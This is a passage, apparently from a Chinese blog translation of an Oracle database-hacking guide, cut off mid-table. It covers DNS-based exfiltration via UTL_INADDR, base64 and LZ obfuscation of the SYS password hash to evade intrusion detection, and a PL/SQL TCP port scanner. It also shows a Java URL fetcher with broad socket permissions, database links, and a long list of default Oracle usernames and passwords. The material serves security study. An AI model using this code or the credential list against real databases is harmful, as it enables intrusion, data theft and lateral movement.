class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 78</span><br><span class="line">      Identifier: 18150</span><br><span class="line">      Flags: 0x0000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 17 (UDP)</span><br><span class="line">      Checksum: 0x6a17</span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 194.72.6.57</span><br><span class="line">UDP Header</span><br><span class="line">      Source port: 1309</span><br><span class="line">      Dest port: 53</span><br><span class="line">      Length: 58</span><br><span class="line">      Checksum: 0x2cce</span><br><span class="line">DNS Packet</span><br><span class="line">      Identification: 49</span><br><span class="line">      Flags: 0x0100</span><br><span class="line">            DNS Query</span><br><span class="line">            Standard Query</span><br><span class="line">            DNS Message was NOT truncated</span><br><span class="line">            RD (Recursion Desired)</span><br><span class="line">            Server does not support recursive queries</span><br><span class="line">      No. of Questions: 1</span><br><span class="line">      No. of Answer Resource Records: 0</span><br><span class="line">      No. of Name Server Resource Records: 0</span><br><span class="line">      No. Additional Resource Records: 0</span><br><span class="line">      Query Name : 0D47B550C5F70DED.ngssoftware.com</span><br><span class="line">            Query Type : A (Host Address)</span><br><span class="line">            Query Class : IN (Internet Class)</span><br></pre></td></tr></table></figure><p>该查询最终到达 NGS DNS服务器，因此可以被捕获。 使用 UTL_INADDR 时，主机名最长可达 254 个字节。 其中，许多字节将用于域 - 例如，ngssoftware.com。 此外，主机名的每个部分都限制为 64 个字符，其中最后一个必须是一个点。</p><p>同样，因为 UTL_INADDR 是一个函数，所以它在 SQL 注入场景中很有用。</p><h3 id="在泄露之前加密数据"><a href="#在泄露之前加密数据" class="headerlink" title="在泄露之前加密数据"></a>在泄露之前加密数据</h3><p>一些数据库入侵检测产品检查离开服务器的数据以确定它是否与给定的模式匹配 - 例如，个人身份信息 (PII)，如信用卡号或社会保险号。 为了避免触发警报，攻击者可能会在窃取数据之前混淆甚至加密数据。 任何嗅探网络线路的人只会看到看起来无辜的废话或随机字符串。 毋庸置疑，对某些人来说，这可能被视为妥协的证据，因此攻击者需要保持平衡。 以信用卡为例，寻找离开数据库服务器的此类数据的设备通常会被两个或多个卡号的简单串联所欺骗。 数字的每个字符都可以与一个常量相加 - 例如，0x20 - 使用字符 P 到 Y 使数字字符串成为字母字符串。也可以使用 DBMS_OBUSCATION_TOOLKIT、DBMS_CRYPTO 或 UTL_ENCODE 等包。 例如，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_encode.base64_encode((select password from dba_users where username = &#x27;SYS&#x27;)) from dual;</span><br></pre></td></tr></table></figure><p>结果是“30367274702B3268744B6F3D”的base64编码字符串。</p><p>另一种替代方法是使用 UTL_COMPRESS 的 LZ_COMPRESS 函数，该函数使用 Lempel-Ziv 压缩算法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_compress.lz_compress((select password from dba_users where username = &#x27;SYS&#x27;),6) from dual;</span><br></pre></td></tr></table></figure><p>生成字符串“1F8B080000000000000BBBBCEAEDF2B70BB7 AC020094E6B32C08000000”。</p><p>这些混淆方法可用于带内和带外方法。</p><h3 id="攻击网络上的其他系统"><a href="#攻击网络上的其他系统" class="headerlink" title="攻击网络上的其他系统"></a>攻击网络上的其他系统</h3><p>您刚刚看到 UTL_TCP 可用于在任意 TCP 端口上创建与网络上其他主机的连接。 可以编写脚本将 Oracle 数据库服务器变成 TCP 端口扫描器（可能是有史以来最昂贵的！）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE PACKAGE TCP_SCAN IS</span><br><span class="line">PROCEDURE SCAN(HOST VARCHAR2, START_PORT NUMBER, END_PORT NUMBER,</span><br><span class="line">VERBOSE NUMBER DEFAULT 0);</span><br><span class="line">PROCEDURE CHECK_PORT(HOST VARCHAR2, TCP_PORT NUMBER, VERBOSE NUMBER</span><br><span class="line">DEFAULT 0);</span><br><span class="line">END TCP_SCAN;</span><br><span class="line">/</span><br><span class="line">SHOW ERRORS</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PACKAGE BODY TCP_SCAN IS</span><br><span class="line">PROCEDURE SCAN(HOST VARCHAR2, START_PORT NUMBER, END_PORT NUMBER,</span><br><span class="line">VERBOSE NUMBER DEFAULT 0) AS</span><br><span class="line">I NUMBER := START_PORT;</span><br><span class="line">BEGIN</span><br><span class="line">      FOR I IN START_PORT..END_PORT LOOP</span><br><span class="line">            CHECK_PORT(HOST,I,VERBOSE);</span><br><span class="line">      END LOOP;</span><br><span class="line"></span><br><span class="line">EXCEPTION WHEN OTHERS THEN</span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(&#x27;An error occurred.&#x27;);</span><br><span class="line">END SCAN;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PROCEDURE CHECK_PORT(HOST VARCHAR2, TCP_PORT NUMBER, VERBOSE NUMBER</span><br><span class="line">DEFAULT 0) AS</span><br><span class="line">CN SYS.UTL_TCP.CONNECTION;</span><br><span class="line">NETWORK_ERROR EXCEPTION;</span><br><span class="line">PRAGMA EXCEPTION_INIT(NETWORK_ERROR,-29260);</span><br><span class="line">BEGIN</span><br><span class="line">      DBMS_OUTPUT.ENABLE(1000000);</span><br><span class="line">      CN := UTL_TCP.OPEN_CONNECTION(HOST, TCP_PORT);</span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(&#x27;TCP Port &#x27; || TCP_PORT || &#x27; on &#x27; || HOST ||</span><br><span class="line">&#x27; is open.&#x27;);</span><br><span class="line">      UTL_TCP.CLOSE_CONNECTION(CN);</span><br><span class="line">EXCEPTION WHEN NETWORK_ERROR THEN</span><br><span class="line">      IF VERBOSE !=0 THEN</span><br><span class="line">            DBMS_OUTPUT.PUT_LINE(&#x27;TCP Port &#x27; || TCP_PORT || &#x27; on &#x27; ||</span><br><span class="line">HOST || &#x27; is not open.&#x27;);</span><br><span class="line">      END IF;</span><br><span class="line">      WHEN OTHERS THEN</span><br><span class="line">            DBMS_OUTPUT.PUT_LINE(&#x27;There was an error.&#x27;);</span><br><span class="line">END CHECK_PORT;</span><br><span class="line"></span><br><span class="line">END TCP_SCAN;</span><br><span class="line">/</span><br><span class="line">SHOW ERRORS</span><br><span class="line">/</span><br><span class="line">EXEC TCP_SCAN.SCAN(&#x27;192.168.0.10&#x27;,1,200,1);</span><br></pre></td></tr></table></figure><p>UTL_TCP 还可以用作 shellcode 的传递机制，利用其他网络服务器中的缓冲区溢出漏洞——例如，Windows 系统上的 IRemoteActivation 溢出或 Solaris in.lpd 溢出。</p><h3 id="Java和网络"><a href="#Java和网络" class="headerlink" title="Java和网络"></a>Java和网络</h3><p>当然，您可以使用 Java 使用套接字或其他预先打包的网络类（如 URL）来连接网络，但要这样做，用户需要连接并解析 java.net.SocketPermission：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission(&#x27;SCOTT&#x27;, &#x27;SYS:java.net.SocketPermission&#x27;,&#x27;*&#x27;, &#x27;connect, resolve&#x27;);</span><br></pre></td></tr></table></figure><p>一旦你有了它，你就可以连接到任何主机——这在前面的语句中用星号表示。 以下代码使用 URL 类使您能够连接到 Web 服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAURL&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.net.*;</span><br><span class="line"></span><br><span class="line">public class JAVAURL</span><br><span class="line">&#123;</span><br><span class="line">      public static void getUrl (String purl) throws IOException</span><br><span class="line">       &#123;</span><br><span class="line">              try</span><br><span class="line">              &#123;</span><br><span class="line">                  URL url = new URL(purl);</span><br><span class="line">                  InputStream is = url.openStream();</span><br><span class="line">                  BufferedInputStream bis = new BufferedInputStream(is);</span><br><span class="line">                  int page;</span><br><span class="line"></span><br><span class="line">                  while(true)</span><br><span class="line">                  &#123;</span><br><span class="line">                        page = bis.read();</span><br><span class="line">                        if(page == -1)</span><br><span class="line">                              break;</span><br><span class="line">                        System.out.print((char)page);</span><br><span class="line">                  &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (MalformedURLException mue)</span><br><span class="line">            &#123;</span><br><span class="line">                  System.err.println (&quot;Invalid URL&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (IOException io)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                  System.err.println (&quot;Read Error -&quot; + io);</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAURLPROC (purl IN VARCHAR2)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAURL.getUrl (java.lang.String)&#x27;;</span><br><span class="line">/</span><br><span class="line">set serveroutput on</span><br><span class="line">exec dbms_java.set_output(2000);</span><br><span class="line">exec javaurlproc(&#x27;http://www.databasesecurity.com/&#x27;);</span><br></pre></td></tr></table></figure><h3 id="数据库链接"><a href="#数据库链接" class="headerlink" title="数据库链接"></a>数据库链接</h3><p>当涉及到网络上的其他 Oracle 数据库服务器时，可以使用数据库链接。 数据库链接是一种特殊的数据库对象，它将一个 Oracle 服务器连接到另一个。 它是使用 CREATE DATABASE LINK 语句创建的。 链接可以共享，即公共或私有。 以下将创建一个私人链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create database link remote_db connect to scott identified by tiger</span><br><span class="line">using &#x27;(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)</span><br><span class="line">(HOST=192.168.0.120)(PORT=1521))(CONNECT_DATA=</span><br><span class="line"></span><br><span class="line">(SERVICE_NAME=orcl.ngssoftware.com)))&#x27;;</span><br></pre></td></tr></table></figure><p>已创建数据库链接。 创建后，可以使用 @ 符号查询链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt;SELECT USERNAME FROM ALL_USERS@REMOTE_DB</span><br></pre></td></tr></table></figure><p>如果用户名和密码正确，第一个服务器将连接到第二个服务器并查询 ALL_USERS 表。</p><h2 id="附录A-默认用户名和密码"><a href="#附录A-默认用户名和密码" class="headerlink" title="附录A-默认用户名和密码"></a>附录A-默认用户名和密码</h2><p>Oracle 以安装大量带有默认密码的默认用户帐户而闻名。 尽管 Oracle 10g 的情况有所改善，但仍有许多数据库服务器使用默认帐户。 下表列出了默认用户名和密码。</p><table><thead><tr><th><strong>USERNAME</strong></th><th><strong>PASSWORD</strong></th></tr></thead><tbody><tr><td>AASH</td><td>AASH</td></tr><tr><td>ABA1</td><td>ABA1</td></tr><tr><td>ABM</td><td>ABM</td></tr><tr><td>ADAMS</td><td>WOOD</td></tr><tr><td>ADS</td><td>ADS</td></tr><tr><td>ADSEUL_US</td><td>WELCOME</td></tr><tr><td>AHL</td><td>AHL</td></tr><tr><td>AHM</td><td>AHM</td></tr><tr><td>AK</td><td>AK</td></tr><tr><td>AL</td><td>AL</td></tr><tr><td>ALA1</td><td>ALA1</td></tr><tr><td>ALLUSERS</td><td>ALLUSERS</td></tr><tr><td>ALR</td><td>ALR</td></tr><tr><td>AMA1</td><td>AMA1</td></tr><tr><td>AMA2</td><td>AMA2</td></tr><tr><td>AMA3</td><td>AMA3</td></tr><tr><td>AMA4</td><td>AMA4</td></tr><tr><td>AMF</td><td>AMF</td></tr><tr><td>AMS</td><td>AMS</td></tr><tr><td>AMS1</td><td>AMS1</td></tr><tr><td>AMS2</td><td>AMS2</td></tr><tr><td>AMS3</td><td>AMS3</td></tr><tr><td>AMS4</td><td>AMS4</td></tr><tr><td>AMSYS</td><td>AMSYS</td></tr><tr><td>AMV</td><td>AMV</td></tr><tr><td>AMW</td><td>AMW</td></tr><tr><td>ANNE</td><td>ANNE</td></tr><tr><td>AOLDEMO</td><td>AOLDEMO</td></tr><tr><td>AP</td><td>AP</td></tr><tr><td>APA1</td><td>APA1</td></tr><tr><td>APA2</td><td>APA2</td></tr><tr><td>APA3</td><td>APA3</td></tr><tr><td>APA4</td><td>APA4</td></tr><tr><td>APPLEAD</td><td>APPLEAD</td></tr><tr><td>APPLSYS</td><td>FND</td></tr><tr><td>APPLSYS</td><td>APPS</td></tr><tr><td>APPLSYSPUB</td><td>PUB</td></tr><tr><td>APPS</td><td>APPS</td></tr><tr><td>APS1</td><td>APS1</td></tr><tr><td>APS2</td><td>APS2</td></tr><tr><td>APS3</td><td>APS3</td></tr><tr><td>APS4</td><td>APS4</td></tr><tr><td>AQDEMO</td><td>AQDEMO</td></tr><tr><td>AQJAVA</td><td>AQJAVA</td></tr><tr><td>AQUSER</td><td>AQUSER</td></tr><tr><td>AR</td><td>AR</td></tr><tr><td>ARA1</td><td>ARA1</td></tr><tr><td>ARA2</td><td>ARA2</td></tr><tr><td>ARA3</td><td>ARA3</td></tr><tr><td>ARA4</td><td>ARA4</td></tr><tr><td>ARS1</td><td>ARS1</td></tr><tr><td>ARS2</td><td>ARS2</td></tr><tr><td>ARS3</td><td>ARS3</td></tr><tr><td>ARS4</td><td>ARS4</td></tr><tr><td>ART</td><td>ART</td></tr><tr><td>ASF</td><td>ASF</td></tr><tr><td>ASG</td><td>ASG</td></tr><tr><td>ASL</td><td>ASL</td></tr><tr><td>ASN</td><td>ASN</td></tr><tr><td>ASO</td><td>ASO</td></tr><tr><td>ASP</td><td>ASP</td></tr><tr><td>AST</td><td>AST</td></tr><tr><td>AUC_GUEST</td><td>AUC_GUEST</td></tr><tr><td>AURORA$ORB$UNAUTHENTICATED</td><td>INVALID</td></tr><tr><td>AUTHORIA</td><td>AUTHORIA</td></tr><tr><td>AX</td><td>AX</td></tr><tr><td>AZ</td><td>AZ</td></tr><tr><td>B2B</td><td>B2B</td></tr><tr><td>BAM</td><td>BAM</td></tr><tr><td>BCA1</td><td>BCA1</td></tr><tr><td>BCA2</td><td>BCA2</td></tr><tr><td>BEN</td><td>BEN</td></tr><tr><td>BIC</td><td>BIC</td></tr><tr><td>BIL</td><td>BIL</td></tr><tr><td>BIM</td><td>BIM</td></tr><tr><td>BIS</td><td>BIS</td></tr><tr><td>BIV</td><td>BIV</td></tr><tr><td>BIX</td><td>BIX</td></tr><tr><td>BLAKE</td><td>PAPER</td></tr><tr><td>BMEADOWS</td><td>BMEADOWS</td></tr><tr><td>BNE</td><td>BNE</td></tr><tr><td>BOM</td><td>BOM</td></tr><tr><td>BP01</td><td>BP01</td></tr><tr><td>BP02</td><td>BP02</td></tr><tr><td>BP03</td><td>BP03</td></tr><tr><td>BP04</td><td>BP04</td></tr><tr><td>BP05</td><td>BP05</td></tr><tr><td>BP06</td><td>BP06</td></tr><tr><td>BSC</td><td>BSC</td></tr><tr><td>BUYACCT</td><td>BUYACCT</td></tr><tr><td>BUYAPPR1</td><td>BUYAPPR1</td></tr><tr><td>BUYAPPR2</td><td>BUYAPPR2</td></tr><tr><td>BUYAPPR3</td><td>BUYAPPR3</td></tr><tr><td>BUYER</td><td>BUYER</td></tr><tr><td>BUYMTCH</td><td>BUYMTCH</td></tr><tr><td>CAMRON</td><td>CAMRON</td></tr><tr><td>CANDICE</td><td>CANDICE</td></tr><tr><td>CARL</td><td>CARL</td></tr><tr><td>CARLY</td><td>CARLY</td></tr><tr><td>CARMEN</td><td>CARMEN</td></tr><tr><td>CARRIECONYERS</td><td>CARRIECONYERS</td></tr><tr><td>CATADMIN</td><td>CATADMIN</td></tr><tr><td>CE</td><td>CE</td></tr><tr><td>CEASAR</td><td>CEASAR</td></tr><tr><td>CENTRA</td><td>CENTRA</td></tr><tr><td>CFD</td><td>CFD</td></tr><tr><td>CHANDRA</td><td>CHANDRA</td></tr><tr><td>CHARLEY</td><td>CHARLEY</td></tr><tr><td>CHRISBAKER</td><td>CHRISBAKER</td></tr><tr><td>CHRISTIE</td><td>CHRISTIE</td></tr><tr><td>CINDY</td><td>CINDY</td></tr><tr><td>CLARK</td><td>CLARK</td></tr><tr><td>CLARK</td><td>CLOTH</td></tr><tr><td>CLAUDE</td><td>CLAUDE</td></tr><tr><td>CLINT</td><td>CLINT</td></tr><tr><td>CLN</td><td>CLN</td></tr><tr><td>CN</td><td>CN</td></tr><tr><td>CNCADMIN</td><td>CNCADMIN</td></tr><tr><td>CONNIE</td><td>CONNIE</td></tr><tr><td>CONNOR</td><td>CONNOR</td></tr><tr><td>CORY</td><td>CORY</td></tr><tr><td>CRM1</td><td>CRM1</td></tr><tr><td>CRM2</td><td>CRM2</td></tr><tr><td>CRP</td><td>CRP</td></tr><tr><td>CRPB733</td><td>CRPB733</td></tr><tr><td>CRPCTL</td><td>CRPCTL</td></tr><tr><td>CRPDTA</td><td>CRPDTA</td></tr><tr><td>CS</td><td>CS</td></tr><tr><td>CSADMIN</td><td>CSADMIN</td></tr><tr><td>CSAPPR1</td><td>CSAPPR1</td></tr><tr><td>CSC</td><td>CSC</td></tr><tr><td>CSD</td><td>CSD</td></tr><tr><td>CSDUMMY</td><td>CSDUMMY</td></tr><tr><td>CSE</td><td>CSE</td></tr><tr><td>CSF</td><td>CSF</td></tr><tr><td>CSI</td><td>CSI</td></tr><tr><td>CSL</td><td>CSL</td></tr><tr><td>CSM</td><td>CSM</td></tr><tr><td>CSMIG</td><td>CSMIG</td></tr><tr><td>CSP</td><td>CSP</td></tr><tr><td>CSR</td><td>CSR</td></tr><tr><td>CSS</td><td>CSS</td></tr><tr><td>CTXDEMO</td><td>CTXDEMO</td></tr><tr><td>CTXSYS</td><td>CTXSYS</td></tr><tr><td>CTXSYS</td><td>CHANGE_ON_INSTALL</td></tr><tr><td>CTXTEST</td><td>CTXTEST</td></tr><tr><td>CUA</td><td>CUA</td></tr><tr><td>CUE</td><td>CUE</td></tr><tr><td>CUF</td><td>CUF</td></tr><tr><td>CUG</td><td>CUG</td></tr><tr><td>CUI</td><td>CUI</td></tr><tr><td>CUN</td><td>CUN</td></tr><tr><td>CUP</td><td>CUP</td></tr><tr><td>CUS</td><td>CUS</td></tr><tr><td>CZ</td><td>CZ</td></tr><tr><td>DAVIDMORGAN</td><td>DAVIDMORGAN</td></tr><tr><td>DBSNMP</td><td>DBSNMP</td></tr><tr><td>DCM</td><td>DCM</td></tr><tr><td>DD7333</td><td>DD7333</td></tr><tr><td>DD7334</td><td>DD7334</td></tr><tr><td>DD810</td><td>DD810</td></tr><tr><td>DD811</td><td>DD811</td></tr><tr><td>DD812</td><td>DD812</td></tr><tr><td>DD9</td><td>DD9</td></tr><tr><td>DDB733</td><td>DDB733</td></tr><tr><td>DDD</td><td>DDD</td></tr><tr><td>DEMO8</td><td>DEMO8</td></tr><tr><td>DES</td><td>DES</td></tr><tr><td>DES2K</td><td>DES2K</td></tr><tr><td>DEV2000_DEMOS</td><td>DEV2000_DEMOS</td></tr><tr><td>DEVB733</td><td>DEVB733</td></tr><tr><td>DEVUSER</td><td>DEVUSER</td></tr><tr><td>DGRAY</td><td>WELCOME</td></tr><tr><td>DIP</td><td>DIP</td></tr><tr><td>DISCOVERER5</td><td>DISCOVERER5</td></tr><tr><td>DKING</td><td>DKING</td></tr><tr><td>DLD</td><td>DLD</td></tr><tr><td>DMADMIN</td><td>MANAGER</td></tr><tr><td>DMATS</td><td>DMATS</td></tr><tr><td>DMS</td><td>DMS</td></tr><tr><td>DMSYS</td><td>DMSYS</td></tr><tr><td>DOM</td><td>DOM</td></tr><tr><td>DPOND</td><td>DPOND</td></tr><tr><td>DSGATEWAY</td><td>DSGATEWAY</td></tr><tr><td>DV7333</td><td>DV7333</td></tr><tr><td>DV7334</td><td>DV7334</td></tr><tr><td>DV810</td><td>DV810</td></tr><tr><td>DV811</td><td>DV811</td></tr><tr><td>DV812</td><td>DV812</td></tr><tr><td>DV9</td><td>DV9</td></tr><tr><td>DVP1</td><td>DVP1</td></tr><tr><td>EAA</td><td>EAA</td></tr><tr><td>EAM</td><td>EAM</td></tr><tr><td>EC</td><td>EC</td></tr><tr><td>ECX</td><td>ECX</td></tr><tr><td>EDR</td><td>EDR</td></tr><tr><td>EDWEUL_US</td><td>EDWEUL_US</td></tr><tr><td>EDWREP</td><td>EDWREP</td></tr><tr><td>EGC1</td><td>EGC1</td></tr><tr><td>EGD1</td><td>EGD1</td></tr><tr><td>EGM1</td><td>EGM1</td></tr><tr><td>EGO</td><td>EGO</td></tr><tr><td>EGR1</td><td>EGR1</td></tr><tr><td>END1</td><td>END1</td></tr><tr><td>ENG</td><td>ENG</td></tr><tr><td>ENI</td><td>ENI</td></tr><tr><td>ENM1</td><td>ENM1</td></tr><tr><td>ENS1</td><td>ENS1</td></tr><tr><td>ENTMGR_CUST</td><td>ENTMGR_CUST</td></tr><tr><td>ENTMGR_PRO</td><td>ENTMGR_PRO</td></tr><tr><td>ENTMGR_TRAIN</td><td>ENTMGR_TRAIN</td></tr><tr><td>EOPP_PORTALADM</td><td>EOPP_PORTALADM</td></tr><tr><td>EOPP_PORTALMGR</td><td>EOPP_PORTALMGR</td></tr><tr><td>EOPP_USER</td><td>EOPP_USER</td></tr><tr><td>EUL_US</td><td>EUL_US</td></tr><tr><td>EVM</td><td>EVM</td></tr><tr><td>EXA1</td><td>EXA1</td></tr><tr><td>EXA2</td><td>EXA2</td></tr><tr><td>EXA3</td><td>EXA3</td></tr><tr><td>EXA4</td><td>EXA4</td></tr><tr><td>EXFSYS</td><td>EXFSYS</td></tr><tr><td>EXS1</td><td>EXS1</td></tr><tr><td>EXS2</td><td>EXS2</td></tr><tr><td>EXS3</td><td>EXS3</td></tr><tr><td>EXS4</td><td>EXS4</td></tr><tr><td>FA</td><td>FA</td></tr><tr><td>FEM</td><td>FEM</td></tr><tr><td>FIA1</td><td>FIA1</td></tr><tr><td>FII</td><td>FII</td></tr><tr><td>FLM</td><td>FLM</td></tr><tr><td>FNI1</td><td>FNI1</td></tr><tr><td>FNI2</td><td>FNI2</td></tr><tr><td>FPA</td><td>FPA</td></tr><tr><td>FPT</td><td>FPT</td></tr><tr><td>FRM</td><td>FRM</td></tr><tr><td>FTA1</td><td>FTA1</td></tr><tr><td>FTE</td><td>FTE</td></tr><tr><td>FUN</td><td>FUN</td></tr><tr><td>FV</td><td>FV</td></tr><tr><td>FVP1</td><td>FVP1</td></tr><tr><td>GALLEN</td><td>GALLEN</td></tr><tr><td>GCA1</td><td>GCA1</td></tr><tr><td>GCA2</td><td>GCA2</td></tr><tr><td>GCA3</td><td>GCA3</td></tr><tr><td>GCA9</td><td>GCA9</td></tr><tr><td>GCMGR1</td><td>GCMGR1</td></tr><tr><td>GCMGR2</td><td>GCMGR2</td></tr><tr><td>GCMGR3</td><td>GCMGR3</td></tr><tr><td>GCS</td><td>GCS</td></tr><tr><td>GCS1</td><td>GCS1</td></tr><tr><td>GCS2</td><td>GCS2</td></tr><tr><td>GCS3</td><td>GCS3</td></tr><tr><td>GEORGIAWINE</td><td>GEORGIAWINE</td></tr><tr><td>GL</td><td>GL</td></tr><tr><td>GLA1</td><td>GLA1</td></tr><tr><td>GLA2</td><td>GLA2</td></tr><tr><td>GLA3</td><td>GLA3</td></tr><tr><td>GLA4</td><td>GLA4</td></tr><tr><td>GLS1</td><td>GLS1</td></tr><tr><td>GLS2</td><td>GLS2</td></tr><tr><td>GLS3</td><td>GLS3</td></tr><tr><td>GLS4</td><td>GLS4</td></tr><tr><td>GM_AWDA</td><td>GM_AWDA</td></tr><tr><td>GM_COPI</td><td>GM_COPI</td></tr><tr><td>GM_DPHD</td><td>GM_DPHD</td></tr><tr><td>GM_MLCT</td><td>GM_MLCT</td></tr><tr><td>GM_PLADMA</td><td>GM_PLADMA</td></tr><tr><td>GM_PLADMH</td><td>GM_PLADMH</td></tr><tr><td>GM_PLCCA</td><td>GM_PLCCA</td></tr><tr><td>GM_PLCCH</td><td>GM_PLCCH</td></tr><tr><td>GM_PLCOMA</td><td>GM_PLCOMA</td></tr><tr><td>GM_PLCOMH</td><td>GM_PLCOMH</td></tr><tr><td>GM_PLCONA</td><td>GM_PLCONA</td></tr><tr><td>GM_PLCONH</td><td>GM_PLCONH</td></tr><tr><td>GM_PLNSCA</td><td>GM_PLNSCA</td></tr><tr><td>GM_PLNSCH</td><td>GM_PLNSCH</td></tr><tr><td>GM_PLSCTA</td><td>GM_PLSCTA</td></tr><tr><td>GM_PLSCTH</td><td>GM_PLSCTH</td></tr><tr><td>GM_PLVET</td><td>GM_PLVET</td></tr><tr><td>GM_SPO</td><td>GM_SPO</td></tr><tr><td>GM_STKH</td><td>GM_STKH</td></tr><tr><td>GMA</td><td>GMA</td></tr><tr><td>GMD</td><td>GMD</td></tr><tr><td>GME</td><td>GME</td></tr><tr><td>GMF</td><td>GMF</td></tr><tr><td>GMI</td><td>GMI</td></tr><tr><td>GML</td><td>GML</td></tr><tr><td>GMP</td><td>GMP</td></tr><tr><td>GMS</td><td>GMS</td></tr><tr><td>GR</td><td>GR</td></tr><tr><td>GUEST</td><td>GUEST</td></tr><tr><td>HCC</td><td>HCC</td></tr><tr><td>HHCFO</td><td>HHCFO</td></tr><tr><td>HR</td><td>HR</td></tr><tr><td>HRI</td><td>HRI</td></tr><tr><td>HXC</td><td>HXC</td></tr><tr><td>HXT</td><td>HXT</td></tr><tr><td>IA</td><td>IA</td></tr><tr><td>IBA</td><td>IBA</td></tr><tr><td>IBC</td><td>IBC</td></tr><tr><td>IBE</td><td>IBE</td></tr><tr><td>IBP</td><td>IBP</td></tr><tr><td>IBU</td><td>IBU</td></tr><tr><td>IBY</td><td>IBY</td></tr><tr><td>ICX</td><td>ICX</td></tr><tr><td>IEB</td><td>IEB</td></tr><tr><td>IEC</td><td>IEC</td></tr><tr><td>IEM</td><td>IEM</td></tr><tr><td>IEO</td><td>IEO</td></tr><tr><td>IES</td><td>IES</td></tr><tr><td>IEU</td><td>IEU</td></tr><tr><td>IEX</td><td>IEX</td></tr><tr><td>IGC</td><td>IGC</td></tr><tr><td>IGF</td><td>IGF</td></tr><tr><td>IGI</td><td>IGI</td></tr><tr><td>IGS</td><td>IGS</td></tr><tr><td>IGW</td><td>IGW</td></tr><tr><td>IMC</td><td>IMC</td></tr><tr><td>IMT</td><td>IMT</td></tr><tr><td>INS1</td><td>INS1</td></tr><tr><td>INS2</td><td>INS2</td></tr><tr><td>INTERNET_APPSERVER_REGISTRY</td><td>INTERNET_APPSERVER_REGISTRY</td></tr><tr><td>INV</td><td>INV</td></tr><tr><td>IP</td><td>IP</td></tr><tr><td>IPA</td><td>IPA</td></tr><tr><td>IPD</td><td>IPD</td></tr><tr><td>ISC</td><td>ISC</td></tr><tr><td>ISTEWARD</td><td>ISTEWARD</t